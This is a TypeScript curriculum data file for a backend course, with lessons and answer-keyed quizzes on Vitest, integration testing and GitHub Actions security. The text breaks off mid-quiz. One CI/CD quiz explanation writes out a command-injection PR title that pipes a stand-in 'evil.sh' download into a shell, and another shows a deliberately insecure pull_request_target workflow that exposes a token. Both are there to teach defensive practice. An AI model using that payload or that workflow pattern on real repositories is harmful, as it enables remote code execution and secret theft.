import type { Module } from "@/types/curriculum";

export default {
  id: "be-testing-ops",
  trackId: "backend",
  name: "Backend Testing & Ops",
  description:
    "What keeps a Node backend trustworthy after the first deploy: fast unit tests with honest test doubles (Vitest 5 or Jest), integration tests against real databases, GitHub Actions pipelines that are quick and least-privilege, and the logs, metrics, traces and SLOs that tell you it's actually working in production.",
  refs: [
    { label: "Vitest: Guide", url: "https://vitest.dev/guide/", kind: "docs" },
    { label: "GitHub Docs: GitHub Actions", url: "https://docs.github.com/en/actions", kind: "docs" },
    { label: "Google SRE Book", url: "https://sre.google/sre-book/table-of-contents/", kind: "article" },
    { label: "goldbergyoni: JavaScript & Node.js Testing Best Practices", url: "https://github.com/goldbergyoni/javascript-testing-best-practices", kind: "repo" },
  ],
  topics: [
    {
      id: "ops-unit-testing",
      moduleId: "be-testing-ops",
      trackId: "backend",
      title: "Unit Testing Node & Express with Vitest or Jest",
      summary:
        "A unit test pins down one piece of behaviour (a pure function, a service method, a middleware) in milliseconds, with no network, disk or real clock, so hundreds can run on every save. The hard part isn't assertion syntax, it's seams: code that reaches for `Date.now()`, a module-level database client or `process.env` has to be tested through test doubles. Vitest and Jest share almost the same API (`describe`, `it`, `expect`, `vi.fn` or `jest.fn`); Vitest is ESM-native and reuses your Vite config, which makes it the default for many new TypeScript projects. Vitest 5 (September 2026) needs Node 22.12+, turns `clearMocks` on by default, throws when `vi.mock` isn't at the top level, and fails tests whose `.resolves`/`.rejects` assertions aren't awaited.\n\nTest doubles differ in intent. A stub returns canned answers, a spy records calls, a mock is a double you assert interactions on, and a fake is a working lightweight implementation, such as an in-memory repository. Prefer fakes and real collaborators when they're cheap, and mock at boundaries you own (the repository, the payment client) rather than every internal function. Over-mocked tests assert how the code is wired instead of what it does, so they pass while production breaks and fail on every harmless refactor.\n\nTime and shared state cause most flakiness. `vi.useFakeTimers()` replaces `setTimeout`, `setInterval` and `Date` (and `Temporal` in Vitest 5); use the `...Async` advance methods when promises sit between timers. Module state and spies persist across the tests in a file unless you reset or restore them. For Express, keep handlers thin and unit-test the logic they call; test routing and middleware wiring through HTTP with Supertest rather than hand-built `req`/`res` mocks.",
      level: "intermediate",
      estMinutes: 75,
      webRefs: [
        { label: "Vitest: Mocking", url: "https://vitest.dev/guide/mocking", kind: "docs" },
        { label: "Vitest: Mocking timers", url: "https://vitest.dev/guide/mocking/timers", kind: "docs" },
        { label: "Martin Fowler: Mocks Aren't Stubs", url: "https://martinfowler.com/articles/mocksArentStubs.html", kind: "article" },
        { label: "goldbergyoni: JavaScript & Node.js Testing Best Practices", url: "https://github.com/goldbergyoni/javascript-testing-best-practices", kind: "repo" },
      ],
      video: {
        title: "JavaScript Unit Testing Tutorial for Beginners",
        channel: "Programming with Mosh",
        url: "https://www.youtube.com/watch?v=zuKbR4Q428o",
        videoId: "zuKbR4Q428o",
        durationLabel: "48:31",
      },
      alternateVideos: [
        {
          title: "Unit Testing (Vitest) Tutorial #11 - Mock Functions",
          channel: "Net Ninja",
          url: "https://www.youtube.com/watch?v=uX5SF94RBNI",
          videoId: "uX5SF94RBNI",
          durationLabel: "12:10",
        },
        {
          title: "How To Write Better Tests In 6 Easy Steps",
          channel: "Web Dev Simplified",
          url: "https://www.youtube.com/watch?v=FcHUPqKRvxQ",
          videoId: "FcHUPqKRvxQ",
          durationLabel: "19:53",
          startSeconds: 330,
          chapterLabel: "When To Mock",
        },
      ],
      challengeType: "quiz",
      quiz: [
        {
          id: "ops-unit-testing-q1",
          prompt: "Which of these are changes in Vitest 5? (Select all that apply.)",
          options: [
            "`clearMocks` defaults to `true`, so mock call history is cleared before each test",
            "Calling `vi.mock` inside a `describe` or test callback throws instead of warning",
            "An un-awaited `expect(promise).resolves...` assertion fails the test",
            "`vi.mock` is no longer hoisted, so it has to be written after the imports",
            "`restoreMocks` defaults to `true`",
          ],
          correctIndex: 0,
          correctIndices: [0, 1, 2],
          explanation:
            "Vitest 5 made those three stricter defaults. `vi.mock` is still hoisted (which is exactly why a nested call now throws), and `restoreMocks` stays `false`, so spies keep their mocked implementations until you restore them.",
        },
        {
          id: "ops-unit-testing-q2",
          prompt:
            "With Vitest 5's default config, what happens?\n\n```js\nconst onReady = vi.fn();\nbeforeAll(() => {\n  startServer({ onReady }); // calls onReady once, synchronously\n});\ntest('calls onReady once', () => {\n  expect(onReady).toHaveBeenCalledTimes(1);\n});\ntest('still called once', () => {\n  expect(onReady).toHaveBeenCalledTimes(1);\n});\n```",
          options: [
            "Both tests fail, because `clearMocks` wipes the call recorded in `beforeAll` before each test runs",
            "Only the second fails, because the first assertion consumed the recorded call",
            "Only the second fails, because `beforeAll` runs again before it",
            "Both pass: `clearMocks` only affects mocks created inside a test",
          ],
          correctIndex: 0,
          explanation:
            "With `clearMocks: true` (the Vitest 5 default), history is cleared before every test, so calls made in `beforeAll`, setup files or at module top level are gone by the time you assert. Assert inside the hook's test, or set `clearMocks: false` for that project.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-unit-testing-q3",
          prompt:
            "This test times out. Why?\n\n```js\nasync function retry(fn) {\n  try {\n    return await fn();\n  } catch {\n    await new Promise((r) => setTimeout(r, 1000));\n    return fn();\n  }\n}\n\ntest('retries after a second', async () => {\n  vi.useFakeTimers();\n  const fn = vi.fn()\n    .mockRejectedValueOnce(new Error('flaky'))\n    .mockResolvedValueOnce('ok');\n  const p = retry(fn);\n  vi.advanceTimersByTime(1000);\n  await expect(p).resolves.toBe('ok');\n});\n```",
          options: [
            "The `catch` block runs after a microtask, so the timer doesn't exist yet when the clock is advanced; use `await vi.advanceTimersByTimeAsync(1000)`",
            "Fake timers don't support `setTimeout` inside a promise",
            "`mockRejectedValueOnce` rejects synchronously, so `retry` throws before returning a promise",
            "`vi.useFakeTimers()` must be called before `vi.fn()` is created",
          ],
          correctIndex: 0,
          explanation:
            "The synchronous advance fires only timers that already exist. The async variants let pending promise callbacks run between steps, so the timer created in `catch` is scheduled and then fired within the same advance.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-unit-testing-q4",
          prompt:
            "What happens when this test file runs?\n\n```js\nimport { getUser } from './users.js'; // users.js imports ./db.js\n\nconst fakeUser = { id: 1, name: 'Ann' };\nvi.mock('./db.js', () => ({\n  findUser: vi.fn().mockResolvedValue(fakeUser),\n}));\n```",
          options: [
            "It errors: `vi.mock` is hoisted above the imports and `const fakeUser`, so the factory reads `fakeUser` before it's initialised; use `vi.hoisted`",
            "It works: the factory runs lazily, after the whole file has executed",
            "It works, but `users.js` still receives the real `db.js`",
            "It errors because `vi.fn` can't be used inside a mock factory",
          ],
          correctIndex: 0,
          explanation:
            "Vitest moves `vi.mock` to the top of the file and turns static imports into dynamic ones after it, so importing `users.js` runs the factory while `fakeUser` is still in its temporal dead zone. Declare shared values with `const mocks = vi.hoisted(() => ...)`.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-unit-testing-q5",
          prompt:
            "Each test passes when run alone with `.only`, but running the file makes the second one fail. Why?\n\n```js\n// cart.js\nconst items = [];\nexport const add = (item) => items.push(item);\nexport const count = () => items.length;\n\n// cart.test.js\ntest('adds one item', () => {\n  add('apple');\n  expect(count()).toBe(1);\n});\ntest('starts empty', () => {\n  expect(count()).toBe(0);\n});\n```",
          options: [
            "Module state lives for the whole file, so `items` still holds the apple; Vitest isolates files, not individual tests",
            "Vitest runs tests in a file concurrently by default",
            "`isolate: true` should reset modules between tests, so this is a Vitest bug",
            "Arrays are frozen in test mode, so `push` fails silently",
          ],
          correctIndex: 0,
          explanation:
            "This is the classic order-dependent test. Avoid module-level mutable state, or expose a reset and call it in `beforeEach`; `--sequence.shuffle` helps surface these hidden dependencies.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-unit-testing-q6",
          prompt: "Which are signs that a test suite mocks too much? (Select all that apply.)",
          options: [
            "Renaming a private helper breaks tests even though behaviour is unchanged",
            "Every collaborator of the unit is a `vi.fn()`, including pure utility functions",
            "Assertions check `toHaveBeenCalledWith` on internal calls instead of the result or resulting state",
            "The payment provider's HTTP client is replaced by a stub in unit tests",
            "An in-memory fake repository stands in for Postgres in unit tests",
          ],
          correctIndex: 0,
          correctIndices: [0, 1, 2],
          explanation:
            "Over-mocked tests couple themselves to implementation details. Replacing a slow or external boundary with a stub or a fake is the legitimate use of doubles; the smell is mocking your own internals.",
        },
        {
          id: "ops-unit-testing-q7",
          prompt:
            "An in-memory `UserRepository` with working `save` and `findByEmail` methods, used in place of the Postgres implementation, is which kind of test double?",
          options: ["A fake", "A mock", "A stub", "A spy"],
          correctIndex: 0,
          explanation:
            "A fake has a real, simplified implementation you can run behaviour against. A stub only returns canned values, a spy records calls, and a mock is a double you set expectations on and verify interactions with.",
        },
        {
          id: "ops-unit-testing-q8",
          prompt:
            "With Vitest 5's defaults (`clearMocks: true`, `restoreMocks: false`), does test `b` pass?\n\n```js\ntest('a', () => {\n  vi.spyOn(Math, 'random').mockReturnValue(0.5);\n  // ...\n});\ntest('b', () => {\n  expect(Math.random()).not.toBe(0.5);\n});\n```",
          options: [
            "No: clearing only wipes call history, so `Math.random` still returns 0.5 until the spy is restored",
            "Yes: `clearMocks` restores the original implementation before each test",
            "Yes: spies created inside a test are restored automatically when it ends",
            "No: but only because tests in a file share a random seed",
          ],
          correctIndex: 0,
          explanation:
            "`mockClear` keeps implementations, `mockReset` resets them and `mockRestore` also puts back the original method for `vi.spyOn`. Enable `restoreMocks: true` or call `vi.restoreAllMocks()` in `afterEach` when tests spy on globals.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-unit-testing-q9",
          prompt:
            "A handler is unit-tested with a hand-built `res = { status: vi.fn().mockReturnThis(), json: vi.fn() }`. What can that test NOT tell you?",
          options: [
            "Whether the route is registered and whether parsing, auth and error middleware are wired in the right order",
            "Whether the handler calls `res.status(404)` for a missing record",
            "Whether the handler reads `req.params.id`",
            "Whether the handler awaits the service call",
          ],
          correctIndex: 0,
          explanation:
            "A mocked `req`/`res` exercises the function in isolation, which is fine for its logic. The wiring bugs (a parser registered after the route, an error handler with three parameters) only show up when a real request goes through the app, which is what Supertest tests are for.",
        },
        {
          id: "ops-unit-testing-q10",
          prompt: "A module starts `setInterval(poll, 5000)` when imported. A test calls `vi.runAllTimers()`. What happens?",
          options: [
            "It throws after hitting the loop limit (10,000 timers by default), because the interval keeps rescheduling itself",
            "It runs `poll` exactly once",
            "It returns immediately, because intervals aren't faked",
            "It hangs forever",
          ],
          correctIndex: 0,
          explanation:
            "`runAllTimers` runs until the queue is empty, which never happens with an active interval, so the fake clock aborts at `fakeTimers.loopLimit`. Use `advanceTimersByTime` or `runOnlyPendingTimers` for code with intervals.",
        },
        {
          id: "ops-unit-testing-q11",
          prompt: "What's the practical difference between `vi.fn()` and `vi.spyOn(obj, 'method')`?",
          options: [
            "`vi.spyOn` wraps an existing method, calling through to it by default and restorable later; `vi.fn()` creates a standalone mock function",
            "`vi.fn()` records calls, while `vi.spyOn` can only replace implementations",
            "`vi.spyOn` works only on classes, and `vi.fn()` only on plain functions",
            "There's no difference; they're aliases",
          ],
          correctIndex: 0,
          explanation:
            "Use `vi.fn()` for callbacks and injected dependencies, and `vi.spyOn` when the code reaches for a method on a real object (`Math.random`, `console.error`, an imported service object) that you want to observe or override temporarily.",
        },
      ],
    },
    {
      id: "ops-integration-testing",
      moduleId: "be-testing-ops",
      trackId: "backend",
      title: "Integration Testing REST APIs",
      summary:
        "Integration tests check that your code works with the things it actually talks to: the HTTP layer, middleware order, serialization, the database with its constraints, migrations and transactions. They catch what unit tests structurally can't (a parser registered after the route, a unique index that doesn't exist, a migration that disagrees with the ORM model), which is why many backend teams make them the bulk of the suite, the \"testing trophy\" rather than a pyramid. For Express the usual shape is Supertest driving the exported `app` in-process (`await request(app).post('/orders').send(...)`), binding an ephemeral port for you, against a real database.\n\nUse the real engine, not an imitation. SQLite or a hand-rolled mock standing in for Postgres misses dialect differences, JSONB, constraint and locking behaviour. Testcontainers or a `compose.yaml` service gives each run a disposable Postgres or Redis on production's version, started once per run (Vitest `globalSetup`) rather than per test. Isolation is the main design choice. Rolling back a transaction per test is fastest, but it hides commit-time behaviour and breaks when the code opens its own transactions or connections. Truncating tables in `beforeEach` is simple and honest. A database or schema per worker (keyed on `VITEST_POOL_ID`) lets files run in parallel, which Vitest does by default.\n\nFlaky integration tests nearly always come from shared state or time: depending on rows another test created, on result order without `ORDER BY`, on auto-increment ids, on the wall clock, or on parallel files writing the same tables. Seed each test's own data with factories (unique emails per test), assert on what the API returns rather than on internal calls, and fake only true third parties (payments, email) at the network boundary with a tool like MSW or nock.",
      level: "advanced",
      estMinutes: 85,
      webRefs: [
        { label: "Testcontainers for Node.js", url: "https://node.testcontainers.org/", kind: "docs" },
        { label: "Supertest", url: "https://github.com/forwardemail/supertest", kind: "repo" },
        { label: "Martin Fowler: The Practical Test Pyramid", url: "https://martinfowler.com/articles/practical-test-pyramid.html", kind: "article" },
        { label: "Kent C. Dodds: Write tests. Not too many. Mostly integration.", url: "https://kentcdodds.com/blog/write-tests", kind: "article" },
      ],
      video: {
        title: "Testing Express REST API With Jest & Supertest",
        channel: "TomDoesTech",
        url: "https://www.youtube.com/watch?v=r5L1XRZaCR0",
        videoId: "r5L1XRZaCR0",
        durationLabel: "55:43",
      },
      alternateVideos: [
        {
          title: "Testcontainers have forever changed the way I write tests",
          channel: "Dreams of Code",
          url: "https://www.youtube.com/watch?v=sNg0bnMF_qY",
          videoId: "sNg0bnMF_qY",
          durationLabel: "12:11",
        },
      ],
      challengeType: "quiz",
      quiz: [
        {
          id: "ops-integration-testing-q1",
          prompt:
            "This test passes even when `POST /orders` returns a 500. Why?\n\n```js\ntest('creates an order', () => {\n  request(app).post('/orders').send({ sku: 'A1' }).expect(201);\n});\n```",
          options: [
            "The request promise is neither returned nor awaited, so the test finishes before the assertion runs",
            "Supertest only checks status codes when `.end()` is called with a callback",
            "`.expect(201)` compares status classes, so 500 counts as a server response",
            "Vitest 5 treats un-awaited Supertest calls as skipped tests",
          ],
          correctIndex: 0,
          explanation:
            "A Supertest request is lazy and thenable: with no `await` or `return`, the test function completes immediately and the failing assertion (if it runs at all) lands outside the test. `await request(app)...` or `return request(app)...` fixes it; Vitest 5's stricter rule covers `expect(...).resolves`, not this.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-integration-testing-q2",
          prompt: "Which of these make integration tests flaky? (Select all that apply.)",
          options: [
            "Asserting on the order of rows from a query that has no `ORDER BY`",
            "Hard-coding `id: 1` for a record the test just created",
            "Two test files running in parallel and writing to the same tables",
            "Creating each test's records with unique values from a factory",
            "Giving each Vitest worker its own database schema",
          ],
          correctIndex: 0,
          correctIndices: [0, 1, 2],
          explanation:
            "Row order without `ORDER BY` isn't guaranteed, sequences keep counting across tests and runs, and parallel files race each other. Per-test factories and per-worker schemas are the standard cures.",
        },
        {
          id: "ops-integration-testing-q3",
          prompt: "Why is running API integration tests against SQLite, when production runs Postgres, usually a false economy?",
          options: [
            "The engines differ in types, JSON support, constraints, locking and SQL dialect, so tests can pass on code that fails in production",
            "SQLite is slower than a Postgres container for small datasets",
            "Supertest can't connect to SQLite databases",
            "SQLite doesn't support transactions",
          ],
          correctIndex: 0,
          explanation:
            "The point of an integration test is to exercise the real integration. A disposable Postgres of the same major version (Testcontainers or a compose service) costs a few seconds per run and removes a whole class of \"works on SQLite\" bugs.",
        },
        {
          id: "ops-integration-testing-q4",
          prompt:
            "Every test runs inside a database transaction that's rolled back afterwards. Which problem can this isolation strategy hide or cause?",
          options: [
            "Behaviour that only happens at commit (deferred constraints, triggers), and code that uses its own connection can't see the uncommitted test data",
            "Tests leak data into each other",
            "Rollbacks are much slower than truncating every table",
            "It can't be combined with Supertest",
          ],
          correctIndex: 0,
          explanation:
            "Rollback isolation is fast but not free: nothing ever commits, and the app has to share the test's connection or transaction. When the code under test manages its own transactions or uses a pool, truncation or per-worker databases are more honest.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-integration-testing-q5",
          prompt: "A suite of 40 test files needs Postgres. Where should the Testcontainers container be started?",
          options: [
            "Once per run in Vitest's `globalSetup`, passing the connection string to the tests, with truncation or per-worker databases for isolation",
            "In a `beforeEach` in every file, so each test gets a pristine server",
            "In the application's production start script",
            "Nowhere: Testcontainers starts one automatically for each import of the database client",
          ],
          correctIndex: 0,
          explanation:
            "Starting a container takes seconds, so do it once and reset data cheaply between tests. `globalSetup` runs in the main process before workers start and can hand values to tests through `provide`/`inject` or environment variables.",
        },
        {
          id: "ops-integration-testing-q6",
          prompt: "`app.js` calls `app.listen(3000)` when it's imported, and the test files import it for Supertest. What goes wrong?",
          options: [
            "Every test file binds port 3000, so parallel files fail with `EADDRINUSE` and open servers keep workers alive",
            "Supertest refuses to test an app that is already listening",
            "Nothing, because Supertest reuses the existing listener",
            "Express 5 ignores `listen` when `NODE_ENV=test`",
          ],
          correctIndex: 0,
          explanation:
            "Export the `app` from one module and call `listen` only in a separate entry file (`server.js`). Supertest then binds its own ephemeral port per request, with nothing to clean up.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-integration-testing-q7",
          prompt: "Which dependencies should an integration test of `POST /checkout` usually replace with fakes? (Select all that apply.)",
          options: [
            "The payment provider's HTTP API, intercepted at the network boundary",
            "The transactional email service",
            "The application's own Postgres database",
            "The Express router and middleware",
            "The service that calculates order totals",
          ],
          correctIndex: 0,
          correctIndices: [0, 1],
          explanation:
            "Fake the systems you don't own and can't run deterministically, ideally at the HTTP layer (MSW, nock) so your real client code still runs. Your database, routing and domain logic are exactly what the test exists to exercise.",
        },
        {
          id: "ops-integration-testing-q8",
          prompt: "Vitest runs test files in parallel by default. How can integration test files avoid trampling each other's data? (Select all that apply.)",
          options: [
            "Give each worker its own database or schema, named from `process.env.VITEST_POOL_ID`",
            "Set `fileParallelism: false` and accept a slower run",
            "Mark every test with `test.concurrent`",
            "Rely on `isolate: true`, which gives each file its own database",
          ],
          correctIndex: 0,
          correctIndices: [0, 1],
          explanation:
            "`isolate` separates module state between files, not external databases, and `test.concurrent` adds even more parallelism. Either partition the database per worker or serialise the files.",
        },
        {
          id: "ops-integration-testing-q9",
          prompt:
            "Tests share one `seed.sql` loaded at the start of the run, and several tests update or delete those seeded rows. What's the problem?",
          options: [
            "Tests become coupled through shared data, so results depend on execution order and on edits to the seed file",
            "Seed files can't contain foreign keys",
            "Postgres caches the seed and ignores later changes",
            "Nothing, as long as the seed runs before every test file",
          ],
          correctIndex: 0,
          explanation:
            "A shared fixture turns every test into a dependency of every other. Keep a minimal read-only baseline if you must, and let each test create the rows it changes through factories.",
        },
        {
          id: "ops-integration-testing-q10",
          prompt: "Which assertion for `GET /orders?status=open` is the most robust?",
          options: [
            "Check the status code and that the orders this test created appear, each with `status: 'open'`",
            "Snapshot the entire response body, including generated ids and `createdAt` timestamps",
            "Assert the response contains exactly three orders, in insertion order",
            "Spy on the repository and assert it was called with `{ status: 'open' }`",
          ],
          correctIndex: 0,
          explanation:
            "Assert on the behaviour the client relies on, scoped to data the test owns. Snapshots of generated values, exact counts on shared tables and internal-call assertions all break for reasons unrelated to correctness.",
        },
        {
          id: "ops-integration-testing-q11",
          prompt:
            "An integration test posts a truncated body `{\"sku\":` with `Content-Type: application/json` to an Express 5 app that uses `express.json()` and a custom error handler returning `res.status(err.status ?? 500)`. What should it expect?",
          options: [
            "A 400, because the parser raises an error with `status: 400` and `type: 'entity.parse.failed'`",
            "A 500, because any thrown error is a server error",
            "A 200 with `req.body` set to `{}`",
            "A 415, because the body isn't valid JSON",
          ],
          correctIndex: 0,
          explanation:
            "Testing error paths through HTTP proves the parser, the error handler and your error format fit together. A handler that ignores `err.status` would turn every client mistake into a 500, which this test would catch.",
          isEdgeCaseOrInterviewQuestion: true,
        },
      ],
    },
    {
      id: "ops-ci-cd-github-actions",
      moduleId: "be-testing-ops",
      trackId: "backend",
      title: "CI/CD with GitHub Actions",
      summary:
        "CI exists to keep `main` releasable: every push and pull request runs the same checks (install, lint, type-check, unit and integration tests, build) in a clean environment, and branch protection or rulesets turn the required ones into gates instead of suggestions. CD extends that to deployment, ideally promoting one immutable artifact through environments. GitHub Actions models this as workflows (YAML in `.github/workflows`) triggered by events such as `push`, `pull_request`, `workflow_dispatch` and `schedule`, made of jobs that run in parallel on fresh runners unless linked with `needs`, each a list of steps that `run` commands or `uses` actions.\n\nSpeed comes from a few features. `strategy.matrix` fans a job out across Node versions or operating systems, and `fail-fast` (on by default) cancels the rest when one fails. Caching the package manager's download cache (`actions/setup-node` with `cache: npm`) keyed on a hash of the lockfile avoids re-downloading, but an exact key hit restores without saving, so a key that never changes serves a stale cache forever. `concurrency` with `cancel-in-progress` stops superseded runs. Caches are scoped: a pull request's cache is written to its merge ref and can't leak into `main`.\n\nSecurity is where experienced teams still get burned. Give `GITHUB_TOKEN` least privilege with an explicit `permissions` block (listing any permission sets every unlisted one to `none`). Prefer OIDC (`id-token: write`) over long-lived cloud keys, and scope the cloud role's trust to your repository and branch or environment via the `sub` claim. Put production secrets behind an environment with required reviewers, pin third-party actions to a full commit SHA, never interpolate untrusted input like `${{ github.event.pull_request.title }}` into `run:`, and treat `pull_request_target` as privileged: running a fork's code there hands it your secrets.",
      level: "advanced",
      estMinutes: 85,
      isMilestone: true,
      webRefs: [
        { label: "GitHub Docs: Workflow syntax for GitHub Actions", url: "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax", kind: "docs" },
        { label: "GitHub Docs: Secure use reference", url: "https://docs.github.com/en/actions/reference/security/secure-use", kind: "docs" },
        { label: "GitHub Docs: OpenID Connect", url: "https://docs.github.com/en/actions/concepts/security/openid-connect", kind: "docs" },
        { label: "GitHub Security Lab: Preventing pwn requests", url: "https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/", kind: "article" },
      ],
      video: {
        title: "Complete GitHub Actions Course - From BEGINNER to PRO",
        channel: "DevOps Directive",
        url: "https://www.youtube.com/watch?v=Xwpi0ITkL3U",
        videoId: "Xwpi0ITkL3U",
        durationLabel: "3:42:35",
        startSeconds: 1439,
        chapterLabel: "Core Features",
      },
      alternateVideos: [
        {
          title: "Complete GitHub Actions Course - From BEGINNER to PRO",
          channel: "DevOps Directive",
          url: "https://www.youtube.com/watch?v=Xwpi0ITkL3U",
          videoId: "Xwpi0ITkL3U",
          durationLabel: "3:42:35",
          startSeconds: 7051,
          chapterLabel: "Best Practices",
        },
        {
          title: "GitHub Actions Tutorial - Basic Concepts and CI/CD Pipeline with Docker",
          channel: "TechWorld with Nana",
          url: "https://www.youtube.com/watch?v=R8_veQiYBjI",
          videoId: "R8_veQiYBjI",
          durationLabel: "32:30",
        },
      ],
      challengeType: "quiz",
      quiz: [
        {
          id: "ops-ci-cd-github-actions-q1",
          prompt:
            "What's wrong with this cache step?\n\n```yaml\n- uses: actions/cache@v4\n  with:\n    path: ~/.npm\n    key: npm-cache\n```",
          options: [
            "The key never changes, so after the first save every run is an exact hit that restores the old cache and never saves a new one",
            "`~/.npm` can't be cached; only `node_modules` can",
            "Caches expire after every run unless the key includes `github.run_id`",
            "Nothing: the action detects `package-lock.json` changes automatically",
          ],
          correctIndex: 0,
          explanation:
            "Cache entries are immutable per key, and the action skips saving on an exact hit. Key on the lockfile, for example `npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}`, with `restore-keys: npm-${{ runner.os }}-` as a fallback (or just use `setup-node` with `cache: npm`).",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-ci-cd-github-actions-q2",
          prompt:
            "A job declares this block. Which statements are true? (Select all that apply.)\n\n```yaml\npermissions:\n  contents: read\n  id-token: write\n```",
          options: [
            "Every permission not listed, such as `pull-requests` or `packages`, is set to `none`",
            "The job can request an OIDC token to log in to a cloud provider",
            "`actions/checkout` can still read the repository with `GITHUB_TOKEN`",
            "`id-token: write` lets the job push commits to the repository",
            "Fork pull requests get write access because of this block",
          ],
          correctIndex: 0,
          correctIndices: [0, 1, 2],
          explanation:
            "Specifying any permission switches the rest to `none`, which is what makes an explicit block least-privilege. `id-token: write` only allows minting an OIDC token; pushing needs `contents: write`, and fork PRs stay read-only regardless of the workflow file.",
        },
        {
          id: "ops-ci-cd-github-actions-q3",
          prompt:
            "Why is this workflow dangerous?\n\n```yaml\non: pull_request_target\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v6\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm ci && npm test\n        env:\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n```",
          options: [
            "`pull_request_target` runs with the base repository's secrets and a write-capable token, so a fork's code in `npm test` or install scripts can steal `NPM_TOKEN`",
            "It isn't: workflows from forks never receive secrets",
            "The only problem is that `actions/checkout` isn't pinned to a SHA",
            "It tests the base branch's code, so the pull request's changes are never tested",
          ],
          correctIndex: 0,
          explanation:
            "This is the classic \"pwn request\". `pull_request_target` exists for trusted automation such as labelling; building untrusted PR code belongs in a `pull_request` workflow, which gets no secrets and a read-only token for forks.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-ci-cd-github-actions-q4",
          prompt:
            "A step runs `echo \"Checking: ${{ github.event.pull_request.title }}\"`. Why is that a security bug, and what's the fix?",
          options: [
            "The expression is pasted into the script before the shell runs, so a crafted title injects commands; pass it through `env:` and use `\"$TITLE\"`",
            "PR titles can contain emoji that break the runner",
            "It leaks the title into public logs, which is a privacy issue",
            "`${{ }}` expressions are forbidden inside `run:`",
          ],
          correctIndex: 0,
          explanation:
            "A title like `\"; curl https://evil.sh | sh #` becomes part of the generated script. With an intermediate environment variable, the value is only ever data to the shell.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-ci-cd-github-actions-q5",
          prompt:
            "AWS is set up to trust GitHub's OIDC provider for a deploy role. Which trust-policy condition matters most?",
          options: [
            "Restrict the `sub` claim to your repository and a branch or environment, such as `repo:acme/api:environment:production`",
            "Check only `aud: sts.amazonaws.com`, which already identifies your repository",
            "Allow `repo:*` so forks can deploy preview environments",
            "None: only your organisation can mint tokens for this provider",
          ],
          correctIndex: 0,
          explanation:
            "Any workflow in any repository can get a token from the same issuer with `aud: sts.amazonaws.com`, so checking `aud` alone lets strangers' repositories assume your role. The `sub` claim is what ties the token to your repo, branch or environment.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-ci-cd-github-actions-q6",
          prompt:
            "Branch protection requires the `ci-ok` check. The `test` job fails. What happens to the pull request?\n\n```yaml\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n  ci-ok:\n    needs: test\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n```",
          options: [
            "`ci-ok` is skipped because its dependency failed, and a skipped check counts as passing, so the PR may be mergeable",
            "`ci-ok` fails, so the PR is blocked",
            "`ci-ok` stays pending forever and blocks the PR",
            "GitHub runs `ci-ok` anyway because it's a required check",
          ],
          correctIndex: 0,
          explanation:
            "GitHub treats `success`, `skipped` and `neutral` as passing. For an aggregate gate job, use `if: always()` and fail explicitly when any `needs.<job>.result` isn't `success`.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "ops-ci-cd-github-actions-q7",
          prompt:
            "A required workflow uses `on: pull_request: paths: ['src/**']`. A pull request changes only `README.md`. What happens?",
          options: [
            "The workflow doesn't run, its required check stays pending, and the PR can't be merged",
            "The check is marked skipped and counts as passing",
            "GitHub runs the workflow anyway because it's required",
            "The required check is dropped for that PR",
          ],
          correctIndex: 0,
          explanation:
            "Path, branch and commit-message filters skip the whole workflow, so no status is ever reported. Either don't require path-filtered workflows, or run them always and skip individual jobs with an `if` (a skipped job reports success).",
        },
        {
          id: "ops-ci-cd-github-actions-q8",
          prompt:
            "Which statements about this job are true? (Select all that apply.)\n\n```yaml\nstrategy:\n  matrix:\n    node: [22, 24, 26]\n    os: [ubuntu-latest, windows-latest]\n```",
          options: [
            "It creates six jobs",
            "By default, one failing combination cancels the matrix jobs still running or queued",
            "`include` can add one extra combination, such as Node 26 on `macos-latest`",
            "The combinations run one after another, in the order listed",
            "A matrix can generate at most 20 jobs per workflow run",
          ],
          correctIndex: 0,
          correctIndices: [0, 1, 2],
          explanation:
            "Matrix jobs run in parallel (throttle with `max-parallel`), `fail-fast` defaults to `true`, and the limit is 256 jobs per workflow run. Set `fail-fast: false` when you want the full compatibility picture.",
        },
        {
          id: "ops-ci-cd-github-actions-q9",
          prompt: "While debugging, a step prints a base64-encoded copy of a repository secret. What appears in the log?",
          options: [
            "The encoded value in plain sight: masking only matches the exact secret (and values registered with `add-mask`)",
            "`***`, because the runner masks every transformation of a secret",
            "Nothing: steps can't print secrets",
            "The job fails immediately with a secret-leak error",
          ],
          correctIndex: 0,
          explanation:
            "Redaction is string matching on the runner, so encoded, split or JSON-embedded secrets slip through. Register derived values with `::add-mask::`, avoid structured secrets, and if a secret does leak, delete the log and rotate it.",
        },
        {
          id: "ops-ci-cd-github-actions-q10",
          prompt: "What does putting the deploy job in a `production` environment with required reviewers give you?",
          options: [
            "The job waits for approval before it's sent to a runner, and the environment's secrets are only available to that job after its rules pass",
            "The job runs on dedicated production hardware",
            "Every other job in the workflow also waits for approval",
            "The secrets are encrypted with a separate key, but any job can still read them",
          ],
          correctIndex: 0,
          explanation:
            "Protection rules gate a job before it reaches a runner, and environment secrets are scoped to jobs that reference the environment. It's also the natural place to scope OIDC trust (`environment:production` in `sub`).",
        },
        {
          id: "ops-ci-cd-github-actions-q11",
          prompt: "Why pin third-party actions to a full commit SHA instead of a tag like `@v4`?",
          options: [
